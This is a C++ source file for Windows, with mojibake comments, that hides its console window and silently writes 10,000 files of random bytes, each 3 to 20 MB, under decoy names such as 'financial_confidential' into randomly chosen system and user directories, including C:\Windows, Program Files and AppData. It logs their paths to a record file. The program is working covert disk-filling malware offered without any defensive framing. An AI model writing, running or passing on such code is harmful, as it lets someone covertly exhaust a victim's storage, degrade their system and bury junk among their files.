#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <random>
#include <filesystem>
#include <chrono>
#include <cstdlib>
#include <ctime>

namespace fs = std::filesystem;

// ���ؿ���̨����
void HideConsole()
{
    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL) {
        ShowWindow(hwnd, SW_HIDE);
    }
}

// �����ļ���չ���б�
const std::vector<std::string> extensions = {
    ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", 
    ".pdf", ".jpg", ".jpeg", ".png", ".gif", ".mp3", ".mp4", 
    ".avi", ".mov", ".zip", ".rar", ".exe", ".dll", ".html", 
    ".css", ".js", ".json", ".xml", ".csv", ".log", ".bak"
};

// �����ļ���ǰ׺
const std::vector<std::string> prefixes = {
    "report", "data", "document", "presentation", "image", "photo", 
    "video", "archive", "backup", "config", "settings", "temp", 
    "notes", "meeting", "financial", "project", "plan", "analysis", 
    "summary", "manual", "guide", "tutorial", "sample", "test", 
    "draft", "final", "version", "update", "patch", "release"
};

// �����ļ����м䲿��
const std::vector<std::string> middles = {
    "_2023", "_2022", "_2021", "_final", "_draft", "_v1", "_v2", 
    "_v3", "_backup", "_temp", "_old", "_new", "_latest", 
    "_project", "_work", "_personal", "_official", "_confidential", 
    "_secret", "_private", "_public", "_archive", "_copy", "_original"
};

// ��ȡ�����������
std::mt19937& get_random_engine() {
    static std::mt19937 engine(std::random_device{}());
    return engine;
}

// ��������ļ���
std::string generate_filename() {
    auto& engine = get_random_engine();
    std::uniform_int_distribution<size_t> prefix_dist(0, prefixes.size() - 1);
    std::uniform_int_distribution<size_t> middle_dist(0, middles.size() - 1);
    std::uniform_int_distribution<size_t> ext_dist(0, extensions.size() - 1);
    std::uniform_int_distribution<int> num_dist(1, 1000);
    
    std::string filename = prefixes[prefix_dist(engine)] + 
                          middles[middle_dist(engine)] + 
                          "_" + std::to_string(num_dist(engine)) + 
                          extensions[ext_dist(engine)];
    
    return filename;
}

// ��������ļ���С (3-20 MB)
size_t generate_file_size() {
    auto& engine = get_random_engine();
    std::uniform_int_distribution<size_t> size_dist(3 * 1024 * 1024, 20 * 1024 * 1024);
    return size_dist(engine);
}

// ��ȡWindowsϵͳ�ϵ����Ŀ¼
fs::path get_random_directory() {
    auto& engine = get_random_engine();
    
    // Windows����Ŀ¼�б�
    std::vector<fs::path> common_dirs = {
        fs::path("C:\\"),
        fs::path("C:\\Windows"),
        fs::path("C:\\Program Files"),
        fs::path("C:\\Program Files (x86)"),
        fs::path("C:\\Users"),
        fs::path("C:\\Temp"),
        fs::path("D:\\"),
        fs::path("E:\\"),
        fs::path(getenv("USERPROFILE")),
        fs::path(getenv("APPDATA")),
        fs::path(getenv("LOCALAPPDATA")),
        fs::path(getenv("TEMP"))
    };
    
    // ���Դӳ���Ŀ¼��ʼ
    std::shuffle(common_dirs.begin(), common_dirs.end(), engine);
    
    for (const auto& dir : common_dirs) {
        if (fs::exists(dir) && fs::is_directory(dir)) {
            // ���ѡ��һ����Ŀ¼
            std::vector<fs::path> subdirs;
            try {
                for (const auto& entry : fs::directory_iterator(dir)) {
                    if (entry.is_directory()) {
                        subdirs.push_back(entry.path());
                    }
                }
                
                if (!subdirs.empty()) {
                    std::uniform_int_distribution<size_t> dist(0, subdirs.size() - 1);
                    return subdirs[dist(engine)];
                }
            } catch (...) {
                // ����Ȩ�޴����
                continue;
            }
        }
    }
    
    // ���û���ҵ����ʵ���Ŀ¼��������ʱĿ¼
    return fs::temp_directory_path();
}

int main() {
    // ���ؿ���̨����
    HideConsole();
    
    // ��¼�ļ�λ�õ��ļ�·��
    fs::path record_file = "C:\\junk_files_record.txt";
    
    // �򿪼�¼�ļ�(׷��ģʽ)
    std::ofstream record(record_file, std::ios::app);
    if (!record) {
        // ����޷�д��C�̸�Ŀ¼������д����ʱĿ¼
        record_file = fs::temp_directory_path() / "junk_files_record.txt";
        record.open(record_file, std::ios::app);
    }
    
    const int total_files = 10000;
    int files_created = 0;
    
    while (files_created < total_files) {
        try {
            fs::path dir = get_random_directory();
            std::string filename = generate_filename();
            fs::path filepath = dir / filename;
            size_t file_size = generate_file_size();
            
            // �����ļ�
            std::ofstream file(filepath, std::ios::binary);
            if (file) {
                // д���������
                std::vector<char> buffer(1024 * 1024); // 1MB������
                auto& engine = get_random_engine();
                std::uniform_int_distribution<int> byte_dist(0, 255);
                
                size_t remaining = file_size;
                while (remaining > 0) {
                    size_t chunk_size = std::min(buffer.size(), remaining);
                    
                    for (size_t i = 0; i < chunk_size; ++i) {
                        buffer[i] = static_cast<char>(byte_dist(engine));
                    }
                    
                    file.write(buffer.data(), chunk_size);
                    remaining -= chunk_size;
                }
                
                // ��¼�ļ�·��
                record << filepath.string() << "\n";
                files_created++;
            }
        } catch (...) {
            // ���Դ����������
        }
    }
    
    record.close();
    return 0;
}
